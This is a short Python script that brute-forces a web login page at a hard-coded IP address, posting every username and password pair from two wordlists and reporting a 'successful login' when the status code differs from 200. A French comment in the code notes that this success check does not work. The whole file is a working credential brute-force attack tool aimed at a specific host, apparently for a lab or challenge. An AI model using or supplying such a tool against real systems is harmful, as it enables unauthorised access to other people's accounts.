import requests

r = requests.Session()

url = 'http://51.15.136.118:80/pageid.php'

with open('./wordlists/userlist.txt', 'r') as userfile:
    users = userfile.readlines()
with open('./wordlists/passwordlist.txt', 'r') as passfile:
    passwords = passfile.readlines()
i=0
for user in users:
    for password in passwords:
        i+=1
        print(i)
        user = user.strip()
        password = password.strip()
        data = {'username': user, 'password': password}
        print(data)
        a = r.post(url, data=data)
        print(a.status_code)
        """ fonctionne pas, met 200 mm qd requête est vraie, plutôt mettre qd ya redirection = récupère data """
        if (a.status_code) != 200:
            print(f'Successful login with username = "{user}" : and password = "{password}".')
            break

        

